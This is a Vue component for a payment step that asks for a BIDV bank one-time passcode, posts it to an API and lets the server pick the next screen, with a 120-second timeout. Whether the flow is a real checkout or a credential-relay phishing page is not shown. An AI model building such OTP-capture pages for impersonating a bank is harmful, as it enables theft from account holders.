<script setup>
import Alarm from "@/components/Layout/common/Alarm.jsx";
import Button from "@/components/Layout/common/Button.jsx";
import {useI18n} from "vue-i18n";
import {reactive, ref} from "vue";
import {ElMessage} from "element-plus";
import {useLikeSearch} from "@/hooks/index.js";
import {useRouter} from 'vue-router'
import {get, post} from "@/api/http.js";
import {otp} from "@/api/url.js";
import {getRoute} from "@/hooks/routes.js";
const {t,locale}=useI18n()
const router=useRouter()
const baseForm = ref();
const {getSearchParams, likeSearchModel} = useLikeSearch();
likeSearchModel.conditionItems = reactive([
  {
    label: "login.otp.BIDV",
    type: "input",
    name: "bank",
    value: "",
    maxLength: 50,
    inputType: "text",
    span:20,
  },
]);
const onSubmit = () => {
  post(otp,getSearchParams()).then(v=>{
    console.log(v)
    router.push({name:getRoute(v.data.step)})
  }).catch(r=>{
    router.replace('/tra/result')
  })
}
const formConfig={
  labelWidth: 150,
  size: "default",
  labelPosition: "right",
}
const priceProps=reactive({
  currency:'VND',
  amount: "99999",
})
</script>

<template>
  <div class="form">
    <div class="form_style">
      <BaseForm
          ref="baseForm"
          :form-items="likeSearchModel.conditionItems"
          :config="formConfig"
      />
    </div>
  </div>
  <div class="footer">
    <Button @btn="onSubmit">{{$t('btn.confirm')}}</Button>
    <Alarm :start-time="120" @time-end="args => $router.replace('/tra/result')"/>
  </div>
</template>

<style scoped lang="less">
/*root:deep(.btn_block){
  margin-bottom: 10px !important;
}*/
</style>